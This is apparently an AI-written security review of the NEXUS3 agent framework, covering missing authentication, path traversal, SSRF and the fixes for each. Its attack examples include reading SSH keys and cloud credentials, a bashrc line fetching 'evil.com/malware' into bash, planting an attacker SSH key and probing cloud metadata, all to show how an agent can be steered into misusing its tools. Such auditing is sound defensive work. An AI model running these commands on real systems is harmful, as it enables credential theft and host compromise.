# NEXUS3 Security Review

**Date:** 2026-01-08
**Scope:** Full codebase security analysis
**Status:** Critical vulnerabilities identified

---

## Executive Summary

NEXUS3 is an AI-powered CLI agent framework with multi-agent server capabilities. This security review identifies several significant vulnerabilities and design concerns that should be addressed before production deployment. The most critical issues are:

1. **No authentication or authorization** on the HTTP JSON-RPC server
2. **Path traversal vulnerabilities** in file operations
3. **Unrestricted file system access** for AI-directed operations
4. **Server-Side Request Forgery (SSRF)** potential in agent communication

---

## 1. HTTP Server Security

### File: `/home/inc/repos/NEXUS3/nexus3/rpc/http.py`

#### 1.1 Localhost Binding (Positive Finding)

The server correctly enforces localhost-only binding:

```python
BIND_HOST = "127.0.0.1"  # Localhost only - NEVER bind to 0.0.0.0

# In run_http_server():
if host not in ("127.0.0.1", "localhost", "::1"):
    raise ValueError(
        f"Security: HTTP server must bind to localhost only, not {host!r}"
    )
```

**Assessment:** This is good defense-in-depth, preventing accidental exposure to network attacks. However, this is the *only* security control on the HTTP server.

#### 1.2 CRITICAL: No Authentication

**Vulnerability:** The HTTP server accepts any request from localhost without authentication.

**Location:** `handle_connection()` in `http.py`

```python
async def handle_connection(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
    pool: AgentPool,
    global_dispatcher: GlobalDispatcher,
) -> None:
    # No authentication check anywhere
    # Any local process can send commands
```

**Impact:**
- Any malicious process running on the same machine can control agents
- Browser-based attacks (CSRF-like) from malicious websites could trigger requests to localhost
- Cross-origin requests from malicious JavaScript could invoke agent operations

**OWASP Category:** A07:2021 - Identification and Authentication Failures

**Recommendation:**
- Implement API key authentication (bearer token in header)
- Generate random API key on server start
- Consider mutual TLS for production deployments
- Add CORS headers to prevent browser-based attacks

#### 1.3 Request Body Size Limiting (Positive Finding)

```python
MAX_BODY_SIZE = 1_048_576  # 1MB

if content_length > MAX_BODY_SIZE:
    raise HttpParseError(
        f"Request body too large: {content_length} > {MAX_BODY_SIZE}"
    )
```

**Assessment:** Good protection against denial-of-service via large payloads.

#### 1.4 Timeout Controls (Positive Finding)

```python
request_line = await asyncio.wait_for(
    reader.readline(),
    timeout=30.0,
)
```

**Assessment:** Good protection against slowloris-style attacks.

#### 1.5 Error Message Information Leakage

**Vulnerability:** Error messages expose internal details:

```python
return make_error_response(
    rpc_request.id,
    INTERNAL_ERROR,
    f"Internal error: {type(e).__name__}: {e}",
)
```

**Impact:** Attackers can gather information about internal implementation.

**OWASP Category:** A01:2021 - Broken Access Control (information disclosure)

**Recommendation:** Log detailed errors server-side, return generic messages to clients.

---

## 2. File Operations Security

### Files:
- `/home/inc/repos/NEXUS3/nexus3/skill/builtin/read_file.py`
- `/home/inc/repos/NEXUS3/nexus3/skill/builtin/write_file.py`
- `/home/inc/repos/NEXUS3/nexus3/core/paths.py`

#### 2.1 CRITICAL: Path Traversal Vulnerability

**Vulnerability:** The `normalize_path()` function does not prevent path traversal attacks.

**Location:** `nexus3/core/paths.py`

```python
def normalize_path(path: str) -> Path:
    # Normalize Windows backslashes to forward slashes
    normalized = path.replace("\\", "/")

    # Create Path and expand user home
    p = Path(normalized).expanduser()

    return p  # No validation of final path!
```

**Attack Vector:**
```python
# AI agent instructed to read sensitive files:
read_file(path="../../../etc/passwd")
read_file(path="/etc/shadow")
read_file(path="~/.ssh/id_rsa")
read_file(path="~/.aws/credentials")
```

**Impact:**
- AI can be manipulated to read any file accessible to the process user
- Sensitive credentials, private keys, and system files can be exfiltrated
- Combined with write_file, complete system compromise is possible

**OWASP Category:** A01:2021 - Broken Access Control

**Recommendation:**
```python
def normalize_path(path: str, sandbox_dir: Path | None = None) -> Path:
    # ... existing normalization ...

    # Resolve to absolute path
    p = p.resolve()

    # If sandboxing enabled, verify path is within allowed directory
    if sandbox_dir:
        sandbox = sandbox_dir.resolve()
        if not p.is_relative_to(sandbox):
            raise SecurityError(f"Path {p} is outside sandbox {sandbox}")

    return p
```

#### 2.2 CRITICAL: Unrestricted Write Access

**Vulnerability:** `write_file` skill can write to any writable location.

**Location:** `nexus3/skill/builtin/write_file.py`

```python
async def execute(self, path: str = "", content: str = "", **kwargs: Any) -> ToolResult:
    p = normalize_path(path)
    p.parent.mkdir(parents=True, exist_ok=True)  # Creates directories!
    p.write_text(content, encoding="utf-8")
```

**Attack Vectors:**
```python
# Plant malware in startup locations:
write_file(path="~/.bashrc", content="curl evil.com/malware | bash")
write_file(path="~/.config/autostart/evil.desktop", content="...")

# Overwrite system configs (if running as root):
write_file(path="/etc/cron.d/evil", content="...")

# Plant SSH authorized keys:
write_file(path="~/.ssh/authorized_keys", content="ssh-rsa ATTACKER_KEY")
```

**Impact:** Complete system compromise through AI manipulation.

**OWASP Category:** A01:2021 - Broken Access Control

**Recommendation:**
- Implement per-agent sandbox directories
- Whitelist allowed paths/patterns
- Require user confirmation for sensitive paths
- Implement the planned permission levels (YOLO > TRUSTED > SANDBOXED)

#### 2.3 Missing Symlink Attack Prevention

**Vulnerability:** No protection against symlink-based attacks.

```python
# Attacker creates symlink:
# /tmp/innocent.txt -> /etc/passwd

# AI writes to "safe" location:
write_file(path="/tmp/innocent.txt", content="malicious content")
# Actually overwrites /etc/passwd!
```

**Recommendation:** Use `Path.resolve()` and check if resolved path differs significantly from input.

---

## 3. Network Security

### File: `/home/inc/repos/NEXUS3/nexus3/skill/builtin/nexus_send.py`

#### 3.1 HIGH: Server-Side Request Forgery (SSRF)

**Vulnerability:** The `nexus_send` skill allows AI to make HTTP requests to arbitrary URLs.

```python
async def execute(
    self, url: str = "", content: str = "", request_id: str = "", **kwargs: Any
) -> ToolResult:
    if not url:
        return ToolResult(error="No url provided")

    async with NexusClient(url) as client:  # No URL validation!
        result = await client.send(content, int(request_id) if request_id else None)
```

**Attack Vectors:**
```python
# Access cloud metadata services:
nexus_send(url="http://169.254.169.254/latest/meta-data/", content="list")

# Scan internal network:
nexus_send(url="http://192.168.1.1:8080/admin", content="probe")

# Access other localhost services:
nexus_send(url="http://localhost:6379/", content="INFO")  # Redis
nexus_send(url="http://localhost:9200/", content="GET /")  # Elasticsearch
```

**Impact:**
- Cloud credential theft (AWS/GCP/Azure metadata)
- Internal network reconnaissance
- Access to internal services that trust localhost

**OWASP Category:** A10:2021 - Server-Side Request Forgery (SSRF)

**Recommendation:**
```python
ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}
BLOCKED_IP_RANGES = [
    ipaddress.ip_network("169.254.0.0/16"),  # Link-local
    ipaddress.ip_network("10.0.0.0/8"),       # Private
    ipaddress.ip_network("172.16.0.0/12"),   # Private
    ipaddress.ip_network("192.168.0.0/16"),  # Private
]

def validate_url(url: str) -> bool:
    parsed = urlparse(url)
    # Only allow HTTP/HTTPS
    if parsed.scheme not in ("http", "https"):
        return False
    # Resolve and check IP ranges
    # ... implementation ...
```

---

## 4. API Key and Credential Handling

### File: `/home/inc/repos/NEXUS3/nexus3/provider/openrouter.py`

#### 4.1 Environment Variable for API Keys (Positive Finding)

```python
api_key = os.environ.get(self._config.api_key_env)
if not api_key:
    raise ProviderError(
        f"API key not found. Set the {self._config.api_key_env} environment variable."
    )
```

**Assessment:** Good practice - API keys are not stored in config files.

#### 4.2 API Key in Memory

**Concern:** API key stored in plain memory throughout process lifetime.

```python
self._api_key = self._get_api_key()
```

**Recommendation:** Consider using secure memory handling for sensitive data (though Python makes this difficult).

---

## 5. Input Validation

### File: `/home/inc/repos/NEXUS3/nexus3/rpc/protocol.py`

#### 5.1 JSON-RPC Validation (Positive Finding)

```python
def parse_request(line: str) -> Request:
    # Parse JSON
    try:
        data = json.loads(line)
    except json.JSONDecodeError as e:
        raise ParseError(f"Invalid JSON: {e}") from e

    # Validate it's an object
    if not isinstance(data, dict):
        raise ParseError("Request must be a JSON object")

    # Validate jsonrpc version
    jsonrpc = data.get("jsonrpc")
    if jsonrpc != "2.0":
        raise ParseError(f"jsonrpc must be '2.0', got: {jsonrpc!r}")
```

**Assessment:** Good input validation for JSON-RPC protocol compliance.

#### 5.2 Agent ID Validation

**Vulnerability:** Agent IDs are not validated for malicious characters.

**Location:** `nexus3/rpc/global_dispatcher.py`

```python
async def _handle_create_agent(self, params: dict[str, Any]) -> dict[str, Any]:
    agent_id = params.get("agent_id")
    # Only type checking, no content validation
    if agent_id is not None and not isinstance(agent_id, str):
        raise InvalidParamsError(...)
```

**Impact:** Agent IDs could contain path traversal sequences affecting log directories:

```python
# Creates log directory at unexpected location:
create_agent(agent_id="../../../tmp/evil")
```

**Recommendation:** Validate agent IDs against allowlist pattern (alphanumeric, hyphen, underscore only).

---

## 6. Logging and Sensitive Data

### File: `/home/inc/repos/NEXUS3/nexus3/session/logging.py`

#### 6.1 Conversation Logging

**Concern:** All conversations are logged to disk, including potentially sensitive data.

**Location:** Session logs in `.nexus3/logs/`

**Impact:**
- User secrets shared in conversation are persisted
- API keys accidentally pasted are logged
- Privacy-sensitive information retained

**Recommendation:**
- Document data retention clearly
- Consider configurable log sanitization
- Implement log encryption at rest
- Add log rotation and cleanup policies

#### 6.2 Raw API Logging

**Location:** `openrouter.py`

```python
if self._raw_log:
    self._raw_log.on_request(url, body)
```

**Concern:** Raw API requests/responses include full conversation context when `--raw-log` enabled.

---

## 7. Denial of Service Considerations

#### 7.1 Tool Execution Loop Limit (Positive Finding)

```python
max_iterations = 10  # Prevent infinite loops

for _ in range(max_iterations):
    # ... tool execution loop ...
```

**Assessment:** Good protection against infinite tool call loops.

#### 7.2 Agent Pool Resource Limits

**Vulnerability:** No limit on number of agents that can be created.

**Location:** `nexus3/rpc/pool.py`

```python
async def create(self, agent_id: str | None = None, ...) -> Agent:
    # No limit check
    self._agents[effective_id] = agent
```

**Impact:** Resource exhaustion through unlimited agent creation.

**Recommendation:** Implement `max_agents` configuration limit.

---

## 8. OWASP Top 10 Summary

| OWASP Category | Status | Findings |
|----------------|--------|----------|
| A01 - Broken Access Control | **CRITICAL** | No auth, path traversal, unrestricted file access |
| A02 - Cryptographic Failures | LOW | API keys handled reasonably |
| A03 - Injection | MEDIUM | No command injection, but path injection exists |
| A04 - Insecure Design | **HIGH** | No security layers for AI-directed operations |
| A05 - Security Misconfiguration | MEDIUM | Localhost-only is good, but insufficient |
| A06 - Vulnerable Components | N/A | Not assessed (dependency audit needed) |
| A07 - Auth Failures | **CRITICAL** | No authentication mechanism |
| A08 - Software Integrity | LOW | No concerns identified |
| A09 - Logging Failures | MEDIUM | Sensitive data in logs |
| A10 - SSRF | **HIGH** | Agent can make arbitrary HTTP requests |

---

## 9. Recommendations Priority Matrix

### Critical (Address Immediately)

1. **Implement HTTP server authentication**
   - Add API key/token authentication
   - Generate random key on server start
   - Require key in Authorization header

2. **Implement file operation sandboxing**
   - Add `working_dir` constraint per agent
   - Validate all paths stay within sandbox
   - Block symlink attacks

3. **Add URL allowlisting for nexus_send**
   - Only allow localhost NEXUS agents by default
   - Implement SSRF protections

### High Priority (Address Before Production)

4. **Validate agent IDs**
   - Restrict to safe characters
   - Prevent path traversal in log directories

5. **Implement agent resource limits**
   - Maximum agents per pool
   - Maximum context size per agent

6. **Sanitize error messages**
   - Remove internal details from client responses
   - Log full errors server-side only

### Medium Priority (Ongoing)

7. **Implement the planned permission levels**
   - YOLO: Full access (current behavior, dangerous)
   - TRUSTED: Sandboxed file access
   - SANDBOXED: Read-only, no network

8. **Add CORS headers**
   - Prevent browser-based attacks

9. **Log sanitization**
   - Option to redact sensitive patterns
   - Document data handling

---

## 10. Security Architecture Recommendations

### Defense in Depth Strategy

```
                    +------------------+
                    |  Authentication  |  <- Add API key verification
                    +--------+---------+
                             |
                    +--------v---------+
                    |   Rate Limiting  |  <- Add request rate limits
                    +--------+---------+
                             |
                    +--------v---------+
                    |  Input Validation |  <- Strengthen path validation
                    +--------+---------+
                             |
                    +--------v---------+
                    |    Sandboxing    |  <- Implement file sandboxes
                    +--------+---------+
                             |
                    +--------v---------+
                    |  Skill Execution |
                    +------------------+
```

### Proposed Security Configuration

```python
@dataclass
class SecurityConfig:
    """Security settings for NEXUS3 agents."""

    # Authentication
    require_auth: bool = True
    api_key_env: str = "NEXUS3_API_KEY"

    # Sandboxing
    sandbox_mode: Literal["yolo", "trusted", "sandboxed"] = "trusted"
    allowed_paths: list[Path] = field(default_factory=lambda: [Path.cwd()])
    blocked_paths: list[Path] = field(default_factory=lambda: [
        Path.home() / ".ssh",
        Path.home() / ".aws",
        Path.home() / ".gnupg",
    ])

    # Network
    allow_external_urls: bool = False
    allowed_hosts: list[str] = field(default_factory=lambda: ["127.0.0.1", "localhost"])

    # Resources
    max_agents: int = 10
    max_context_tokens: int = 100000
```

---

## Conclusion

NEXUS3 has a clean, well-structured codebase with good async patterns and proper error handling. However, the security model is fundamentally inadequate for production use. The combination of:

1. No authentication on the HTTP server
2. Unrestricted file system access via AI-directed tools
3. SSRF potential in agent communication
4. No sandboxing or permission boundaries

...creates a significant attack surface where any local process, or potentially malicious websites via CSRF-like attacks, could weaponize the AI agent to compromise the host system.

The planned Phase 5 (Subagent Spawning with permission levels) addresses some of these concerns, but the authentication and path validation issues should be considered blockers for any multi-user or production deployment.

---

*Review conducted by Claude Code security analysis*
